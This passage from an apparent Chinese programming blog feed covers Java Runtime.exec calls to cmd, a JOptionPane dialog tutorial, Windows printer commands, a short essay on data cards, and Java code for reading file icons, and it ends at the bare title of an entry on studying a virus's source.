执行完命令后不关闭命令窗口。 </span></span><br><span class="line"><span class="keyword">cmd</span><span class="bash"> /c start <span class="built_in">command</span> 会打开一个新窗口后执行命令，原窗口会关闭。 </span></span><br><span class="line"><span class="keyword">cmd</span><span class="bash"> /k start <span class="built_in">command</span> 会打开一个新窗口后执行命令，原窗口不会关闭。</span></span><br></pre></td></tr></table></figure><p>将命令改变后，就可以正常使用会弹出新窗口的工具了</p><p>但是，如果要调用出命令行及没有图型界面的工具或程序，则要用后面两个命令，不然不会弹出。</p><p>例如：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span>.exec(<span class="string">"cmd /c  powershell"</span>);       <span class="comment">// 无反应</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span>.exec(<span class="string">"cmd /c  start powershell"</span>); <span class="comment">// 成功调出powershell</span></span><br></pre></td></tr></table></figure><p>个人理解是: java会在后台运行一个终端,然后再运行输入的代码,但是这个终端是不会到前台的,所以没图形界面的程序虽然能运行,但是无法显示.</p><p>等等,那要怎么获取命令的返回值呢?</p><p>首先,Runtime.getRuntime().exec()会返回被调用的进程,我们需要获取这个进程</p><p>接着,再通过输入流,让java程序读取被调用程序的返回值,再将其输出便可</p><p>例如:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 记得引入java.io中的相关包 */</span></span><br><span class="line"><span class="comment">// 获取进程</span></span><br><span class="line"><span class="built_in">Process</span> <span class="built_in">process</span> = Runtime.getRuntime().exec(<span class="string">"cmd /c dir"</span>); <span class="comment">// 运行dir命令</span></span><br><span class="line"><span class="comment">// 获取进程的输入流 流的方向为(唤醒的进程 -&gt; java程序)</span></span><br><span class="line">BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(<span class="built_in">process</span>.getInputStream()));</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">line</span>;</span><br><span class="line"><span class="comment">// 若读取当前行不为空，就将其输出</span></span><br><span class="line"><span class="keyword">while</span> ((<span class="built_in">line</span> = reader.readLine()) != null) &#123;</span><br><span class="line"> System.out.<span class="built_in">println</span>(<span class="built_in">line</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将流关闭，避免浪费系统资源</span></span><br><span class="line">reader.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure><p>此时,java程序就会打印出DIR命令的执行结果</p><p>但是注意,cmd不能加start参数,因为加上了会创建新的终端执行,java就得不到执行结果了</p><p> <strong>总结:</strong> </p><ol><li><p>java运行可执行文件,随意使用任意一种cmd运行方式</p></li><li><p>执行 *.msc 类文件,cmd要加上start参数(也就是后两种运行模式之一)开启新窗口.</p></li><li><p>想要得到运行的返回值,要先获取到进程,再得到它的输入流,并且cmd不能加上start参数,否则会在新的终端窗口执行.</p></li></ol><p>个人感觉是:带GUI程序任意,终端程序后两种,要得到返回值的话前两种</p><p>补充:</p><p>学生党,单纯做笔记使用,若有不足之处请指正,感激不尽!</p><blockquote><p>转载自<a href="https://www.cnblogs.com/youmiyou/p/15779230.html" target="_blank" rel="noopener">悠米呦-使用 Java 调用 cmd 命令</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>超详细的Java弹窗样式及使用教程【JOptionPane类详细使用教程】</title>
      <link href="/2024/joptionpane-lei-xiang-xi-shi-yong-jiao-cheng/"/>
      <url>/2024/joptionpane-lei-xiang-xi-shi-yong-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<blockquote><p>JOptionPane类是Swing程序设计中进行弹窗设置的主要方式，本文将详细对Java弹窗进行总结，包括弹窗的设置方法和对内容的读取！敬请阅读！</p></blockquote><a id="more"></a><p>Hello！你好哇，我是灰小猿，一个超会写bug的沙雕程序猿！</p><p>今天来和大家分享一个Swing程序设计中关于JOptionPane类的使用，该类的作用呢，其实主要就是设置弹窗，所以在这里也就和大家总结了常用的弹窗设置的方法以及JOptionPane类详细使用说明！</p><p>话不多说上教程！</p><p>JOptionPane类属于Swing组件中的一种，所以导入方式如下：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">import</span> javax.swing.JOptionPane;</span></span><br></pre></td></tr></table></figure><h4 id="四种消息提示框"><a href="#四种消息提示框" class="headerlink" title="四种消息提示框"></a>四种消息提示框</h4><p>在该类中常用的常用的四种消息提示框为：</p><table><thead><tr><th align="center">showConfirmDialog();</th><th align="center">确认对话框</th></tr></thead><tbody><tr><td align="center">showInputDialog();</td><td align="center">输入对话框</td></tr><tr><td align="center">showMessageDialog();</td><td align="center">消息对话框</td></tr><tr><td align="center">showOptionDialog();</td><td align="center">选择对话框</td></tr></tbody></table><h4 id="五种消息类型"><a href="#五种消息类型" class="headerlink" title="五种消息类型"></a>五种消息类型</h4><p>并且每一种消息框都有五种不同的消息类型，消息类型不同时，弹窗所对应的图标也就不同，以下是这五种消息类型：</p><table><thead><tr><th align="center">消息类型</th><th align="center">消息参数</th><th align="center">显示图标</th></tr></thead><tbody><tr><td align="center">错误消息</td><td align="center">ERROR_MESSAGE</td><td align="center"><img src="/img/preloader.gif" data-original="20200818165317141.png" alt="image"></td></tr><tr><td align="center">提示消息</td><td align="center">INFORMATION_MESSAGE</td><td align="center"><img src="/img/preloader.gif" data-original="20200818165327684.png" alt="img"></td></tr><tr><td align="center">警告消息</td><td align="center">WARNING_MESSAGE</td><td align="center"><img src="/img/preloader.gif" data-original="20200818165334754.png" alt="img"></td></tr><tr><td align="center">提问消息</td><td align="center">QUESTION_MESSAGE</td><td align="center"><img src="/img/preloader.gif" data-original="20200818165337796.png" alt="img"></td></tr><tr><td align="center">简约无图标</td><td align="center">PLAIN_MESSAGE</td><td align="center">无图标，直接显示消息内容</td></tr></tbody></table><p>在使用不同类型的消息框时，输入不同的消息类型参数，就可以得到相应的消息框。</p><h4 id="九种对话框参数"><a href="#九种对话框参数" class="headerlink" title="九种对话框参数"></a>九种对话框参数</h4><p>每一种消息提示框都对应有不同的参数的方法，从而得到不同的效果，但总结起来，这四种消息提示框的方法中都基本需要这九个参数：</p><table><thead><tr><th align="center">参数</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">parentComponent</td><td align="center">对话框所在的容器</td></tr><tr><td align="center">Message</td><td align="center">对话框现实的内容</td></tr><tr><td align="center">Title</td><td align="center">对话框标题</td></tr><tr><td align="center">Option type</td><td align="center">选择按钮类型</td></tr><tr><td align="center">Message type</td><td align="center">消息类型</td></tr><tr><td align="center">Icon</td><td align="center">自定义消息图标</td></tr><tr><td align="center">initialSelectionValue</td><td align="center">默认选项或信息</td></tr><tr><td align="center">selectionValues</td><td align="center">选择选项</td></tr><tr><td align="center">Options</td><td align="center">操作选项</td></tr></tbody></table><p>因为这四种对话框中所需要的参数都是以上九种，所以接下来对每一种对话框进行分析，</p><h4 id="确认对话框"><a href="#确认对话框" class="headerlink" title="确认对话框"></a>确认对话框</h4><p>确认对话框（showConfirmDialog）有以下四种构造函数，其中的参数与上表相对应：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">ConfirmDialog(<span class="params">parentComponent</span>, <span class="params">message</span>)</span></span><br><span class="line"><span class="number">2</span>、<span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">ConfirmDialog(<span class="params">parentComponent</span>, <span class="params">message</span>, <span class="params">title</span>, <span class="params">optionType</span>)</span></span><br><span class="line"><span class="number">3</span>、<span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">ConfirmDialog(<span class="params">parentComponent</span>, <span class="params">message</span>, <span class="params">title</span>, <span class="params">optionType</span>,<span class="params">messageType</span>)</span></span><br><span class="line"><span class="number">4</span>、<span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">ConfirmDialog(<span class="params">parentComponent</span>, <span class="params">message</span>, <span class="params">title</span>, <span class="params">optionType</span>, <span class="params">messageType</span>, <span class="params">icon</span>)</span></span><br></pre></td></tr></table></figure><p>实例如下</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">ConfirmDialog(<span class="params">null</span>,<span class="string">"这是确认对话框吗？"</span>,<span class="string">"提示"</span>,JOptionPane.OK_OPTION,JOptionPane.QUESTION_MESSAGE)</span>;<span class="comment">//确认对话框</span></span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="/img/preloader.gif" data-original="20200818165632962.png" alt="img"></p><p>对确认消息对话框消息进行接收的方法：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> userOption =  <span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">ConfirmDialog(<span class="params">null</span>,<span class="string">"这是确认对话框吗？"</span>,<span class="string">"提示"</span>,JOptionPane.OK_OPTION,JOptionPane.QUESTION_MESSAGE)</span>;<span class="comment">//确认对话框</span></span><br><span class="line"><span class="comment">//如果用户选择的是OK</span></span><br><span class="line"><span class="keyword">if</span> (userOption<span class="operator"> == </span>JOptionPane.OK_OPTION) &#123;</span><br><span class="line"> <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>err.println(<span class="string">"是"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"否"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="输入对话框"><a href="#输入对话框" class="headerlink" title="输入对话框"></a>输入对话框</h4><p>输入对话框（showInputDialog）有六种构造函数，分别如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">InputDialog(<span class="params">message</span>)</span>;</span><br><span class="line"><span class="number">2</span>、<span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">InputDialog(<span class="params">parentComponent</span>, <span class="params">message</span>)</span>;</span><br><span class="line"><span class="number">3</span>、<span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">InputDialog(<span class="params">message</span>, <span class="params">initialSelectionValue</span>)</span>;</span><br><span class="line"><span class="number">4</span>、<span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">InputDialog(<span class="params">parentComponent</span>,<span class="params">message</span>,<span class="params">initialSelectionValue</span>)</span></span><br><span class="line"><span class="number">5</span>、<span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">InputDialog(<span class="params">parentComponent</span>,<span class="params">message</span>, <span class="params">title</span>, <span class="params">messageType</span>)</span>;</span><br><span class="line"><span class="number">6</span>、<span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">InputDialog(<span class="params">parentComponent</span>, <span class="params">message</span>, <span class="params">title</span>, <span class="params">messageType</span>, <span class="params">icon</span>, <span class="params">selectionValues</span>, <span class="params">initialSelectionValue</span>)</span></span><br></pre></td></tr></table></figure><p>下面有两个关于该对话框的实例：</p><p>1、显示输入框，供用户输入，实例如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">InputDialog(<span class="params">null</span>,<span class="string">"请输入你的生日："</span>,<span class="string">"输入"</span>,JOptionPane.WARNING_MESSAGE)</span>;<span class="comment">//输入对话框</span></span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="/img/preloader.gif" data-original="20200818170039284.png" alt="img"></p><p>普通输入框情况下获取用户输入内容的方法：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String info = <span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">InputDialog(<span class="params">null</span>,<span class="string">"请输入你的生日："</span>,<span class="string">"输入"</span>,JOptionPane.WARNING_MESSAGE)</span>;<span class="comment">//输入对话框</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(info);</span><br></pre></td></tr></table></figure><p>2、设置一个下拉框，供用户选择输入，最后一个参数表示下拉框默认显示的内容，实例如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String <span class="literal">[]</span> options = &#123;<span class="string">"A选项"</span>,<span class="string">"B选项"</span>,<span class="string">"C选项"</span>,<span class="string">"D选项"</span>&#125;;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">InputDialog(<span class="params">null</span>,<span class="string">"请输入你的选项："</span>,<span class="string">"提示"</span>,JOptionPane.QUESTION_MESSAGE,<span class="params">null</span>,<span class="params">options</span>,<span class="params">options</span>[2])</span>;</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="/img/preloader.gif" data-original="20200818170317641.png" alt></p><p>下拉框情况下获取用户输入内容的方法：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String [] <span class="keyword">options</span> = &#123;"A选项","B选项","C选项","D选项"&#125;;</span><br><span class="line">String <span class="keyword">info</span> =  (String)JOptionPane.showInputDialog(<span class="keyword">null</span>,"请输入你的选项：","提示",JOptionPane.QUESTION_MESSAGE,<span class="keyword">null</span>,<span class="keyword">options</span>,<span class="keyword">options</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">System</span>.<span class="keyword">out</span>.println(<span class="keyword">info</span>);</span><br></pre></td></tr></table></figure><h4 id="消息对话框"><a href="#消息对话框" class="headerlink" title="消息对话框"></a>消息对话框</h4><p>消息对话框（showMessageDialog）有三种构造函数，具体如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">MessageDialog(<span class="params">parentComponent</span>, <span class="params">message</span>)</span>;</span><br><span class="line"><span class="number">2</span>、<span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">MessageDialog(<span class="params">parentComponent</span>, <span class="params">message</span>, <span class="params">title</span>, <span class="params">messageType</span>)</span>;</span><br><span class="line"><span class="number">3</span>、<span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">MessageDialog(<span class="params">parentComponent</span>, <span class="params">message</span>, <span class="params">title</span>, <span class="params">messageType</span>, <span class="params">icon</span>)</span>;</span><br></pre></td></tr></table></figure><p>实例如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">MessageDialog(<span class="params">null</span>,<span class="string">"这里是消息提示对话框！"</span>,<span class="string">"消息提示"</span>,JOptionPane.WARNING_MESSAGE)</span>;<span class="comment">//消息对话框</span></span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="/img/preloader.gif" data-original="20200818170613202.png" alt></p><h4 id="选择对话框"><a href="#选择对话框" class="headerlink" title="选择对话框"></a>选择对话框</h4><p>选择对话框（howOptionDialog）只有一种构造函数如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">OptionDialog(<span class="params">parentComponent</span>, <span class="params">message</span>, <span class="params">title</span>, <span class="params">optionType</span>, <span class="params">messageType</span>, <span class="params">icon</span>, <span class="params">options</span>, <span class="params">initialValue</span>)</span></span><br></pre></td></tr></table></figure><p>使用实例如下。最后一个参数表示默认选择的内容，：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String <span class="literal">[]</span> options = &#123;<span class="string">"A选项"</span>,<span class="string">"B选项"</span>,<span class="string">"C选项"</span>,<span class="string">"D选项"</span>&#125;;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">OptionDialog(<span class="params">null</span>,<span class="string">"请选择你的选项："</span>,<span class="string">"提示"</span>,JOptionPane.YES_NO_OPTION,JOptionPane.QUESTION_MESSAGE,<span class="params">null</span>,<span class="params">options</span>,<span class="params">options</span>[0])</span>;<span class="comment">//选择对话框*/</span></span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="/img/preloader.gif" data-original="20200818170737500.png" alt></p><p>选择对话框下获取用户选项的方法：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String <span class="literal">[]</span> options = &#123;<span class="string">"A选项"</span>,<span class="string">"B选项"</span>,<span class="string">"C选项"</span>,<span class="string">"D选项"</span>&#125;;</span><br><span class="line"><span class="built_in">int</span> n =  <span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">OptionDialog(<span class="params">null</span>,<span class="string">"请选择你的选项："</span>,<span class="string">"提示"</span>,JOptionPane.YES_NO_OPTION,JOptionPane.QUESTION_MESSAGE,<span class="params">null</span>,<span class="params">options</span>,<span class="params">options</span>[0])</span>;<span class="comment">//选择对话框*/</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(options<span class="literal">[<span class="identifier">n</span>]</span>);</span><br></pre></td></tr></table></figure><h4 id="自定义消息图标"><a href="#自定义消息图标" class="headerlink" title="自定义消息图标"></a>自定义消息图标</h4><p>自定义对话框图标的方法如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ImageIcon icon = <span class="keyword">new</span> <span class="constructor">ImageIcon(<span class="string">"it.jpg"</span>)</span>;<span class="comment">//注意设置图片尺寸，50*50px较适合</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JOptionPane</span>.</span></span>show<span class="constructor">MessageDialog(<span class="params">null</span>, <span class="string">"这是自定义图标！"</span>,<span class="string">"提示"</span>,JOptionPane.WARNING_MESSAGE,<span class="params">icon</span>)</span>;</span><br><span class="line"><span class="comment">//该消息框的提示图标会被自定义的图标覆盖掉</span></span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="/img/preloader.gif" data-original="20200818170925372.png" alt></p><p>关于JOptionPane类中弹窗的使用就先分享到这里，之后还会对其他使用继续更新！</p><p>觉得有用记得点赞关注哟！</p><p>大灰狼陪你一起进步！</p><p>同时你也可以关注我的微信公众号“灰狼洞主”后台回复“Java笔记”获取Java精讲视频、面试宝典、项目案例剖析、项目架构等超多资料分享！</p><p><img src="/img/preloader.gif" data-original="20200818171130454.jpg" alt></p><blockquote><p>转载自<a href="https://blog.csdn.net/weixin_44985880/article/details/108081685" target="_blank" rel="noopener">灰小猿-超详细的Java弹窗样式及使用教程【JOptionPane类详细使用教程】</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>控制台操作打印机</title>
      <link href="/2024/kong-zhi-tai-cao-zuo-da-yin-ji/"/>
      <url>/2024/kong-zhi-tai-cao-zuo-da-yin-ji/</url>
      
        <content type="html"><![CDATA[<p>获取已安装的打印机名称</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic printer <span class="keyword">get</span> <span class="built_in">name</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>打开打印机首选项</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 printui.dll,PrintUIEntry <span class="string">/e</span> <span class="string">/n</span> <span class="string">"打印机名称"</span></span><br></pre></td></tr></table></figure><p>打印测试页</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 printui.dll,PrintUIEntry <span class="string">/k</span> <span class="string">/n</span> <span class="string">"打印机名称"</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>流量卡相关</title>
      <link href="/2024/liu-liang-qia-xiang-guan/"/>
      <url>/2024/liu-liang-qia-xiang-guan/</url>
      
        <content type="html"><![CDATA[<blockquote><p>摘自 <a href="https://www.coolapk.com/feed/52223731" target="_blank" rel="noopener">澜派流量卡合集-关于流量卡的一些介绍</a> 写在最后的话</p></blockquote><a id="more"></a>  <p>我们不要把流量卡想成一个多么深不可测的产品和业务，能占他多大的便宜，他就是运营商给到你和正规套餐中间的一个过渡期，我们绝大多数的消费者都经历过从学生校园卡到工作后换套餐的情况，流量卡也是其中的一个环节，在未来的某一天我们终要考虑给家里再安装条宽带，让老公老婆孩子父母也办一张卡，大家去用家庭套餐通话，</p><p>而这个时候，我们心上要算的那笔账可能就从一个月一百G的流量变成柴米油盐了，那个时候我们在回首看过往，蓦然发现摆在我们抽屉里的当初咱们用的一张张手机卡承载的是奔波在外的伙伴夜深人静时刷刷视频给到自己的休息时间，是做销售岗位时不断尝试拨打客户电话的拼搏时间，是技术开发浏览CSDN研究代码的加班时间，更是我们最终安心联系上家人，给父母打一通视频电话时的温馨时间。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java获取文件图标</title>
      <link href="/2024/java-huo-qu-wen-jian-tu-biao/"/>
      <url>/2024/java-huo-qu-wen-jian-tu-biao/</url>
      
        <content type="html"><![CDATA[<blockquote><p>转载自<a href="https://blog.csdn.net/qincidong/article/details/9112251" target="_blank" rel="noopener">Java获取文件图标</a>  </p></blockquote><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.FlowLayout;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.swing.Icon;</span><br><span class="line"><span class="keyword">import</span> javax.swing.ImageIcon;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JFrame;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JLabel;</span><br><span class="line"><span class="keyword">import</span> javax.swing.filechooser.FileSystemView;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetFileIcon</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  String filePath = <span class="string">"D:/luckystar2008/works/QDII/SR/SR_PA02897156-QDII后台估值核算规则优化_任务分配.xlsx"</span>;</span><br><span class="line">  File f = <span class="keyword">new</span> File(filePath);</span><br><span class="line">  JFrame frm = <span class="keyword">new</span> JFrame();</span><br><span class="line">  frm.setSize(<span class="number">300</span>, <span class="number">200</span>);</span><br><span class="line">  frm.setLocationRelativeTo(<span class="keyword">null</span>);</span><br><span class="line">  frm.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line">  frm.setVisible(<span class="keyword">true</span>);</span><br><span class="line">  frm.setLayout(<span class="keyword">new</span> FlowLayout(<span class="number">10</span>,<span class="number">10</span>,FlowLayout.LEADING));</span><br><span class="line">  </span><br><span class="line">  JLabel sl = <span class="keyword">new</span> JLabel(<span class="string">"小图标"</span>);</span><br><span class="line">  frm.add(sl);</span><br><span class="line">  JLabel bl = <span class="keyword">new</span> JLabel(<span class="string">"大图标"</span>);</span><br><span class="line">  frm.add(bl);</span><br><span class="line">  </span><br><span class="line">  sl.setIcon(getSmallIcon(f));</span><br><span class="line">  bl.setIcon(getBigIcon(f));</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取小图标</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> f</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Icon <span class="title">getSmallIcon</span><span class="params">(File f)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (f != <span class="keyword">null</span> &amp;&amp; f.exists()) &#123;</span><br><span class="line">   FileSystemView fsv = FileSystemView.getFileSystemView();</span><br><span class="line">   <span class="keyword">return</span> fsv.getSystemIcon(f);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取大图标</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> f</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Icon <span class="title">getBigIcon</span><span class="params">(File f)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (f!=<span class="keyword">null</span> &amp;&amp; f.exists()) &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">    sun.awt.shell.ShellFolder sf = sun.awt.shell.ShellFolder.getShellFolder(f);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ImageIcon(sf.getIcon(<span class="keyword">true</span>));</span><br><span class="line">   &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">    <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">    e.printStackTrace();</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/preloader.gif" data-original="20130617143841437.png" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>暴风一号 病毒 源码学习</title>
      <link href="/2024/bao-feng-yi-hao-bing-du-yuan-ma-xue-xi/"/>
      <url>/2024/bao-feng-yi-hao-bing-du-yuan-ma-xue-xi/</url>
      
